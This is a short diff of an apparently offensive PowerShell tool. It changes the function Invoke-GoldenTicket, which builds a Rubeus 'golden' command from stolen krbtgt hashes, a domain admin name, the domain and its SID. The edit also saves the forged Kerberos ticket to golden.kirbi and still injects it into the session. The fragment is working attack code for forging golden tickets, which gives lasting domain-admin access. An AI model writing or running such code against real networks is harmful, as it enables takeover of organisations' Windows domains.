@@ -65,7 +65,7 @@ function Invoke-GoldenTips{
 
 function Invoke-GoldenTicket($krbtgt_hashes){
     $domain_admin,$Domain,$domainSID =  Invoke-GoldenTips
-    $command = "golden /rc4:$($krbtgt_hashes) /user:$($domain_admin) /domain:$($Domain) /sid:$($domainSID) /nowrap /ptt"
+    $command = "golden /rc4:$($krbtgt_hashes) /user:$($domain_admin) /domain:$($Domain) /sid:$($domainSID) /outfile:golden.kirbi /nowrap /ptt"
     Invoke-Rubeus($command)
 }
 
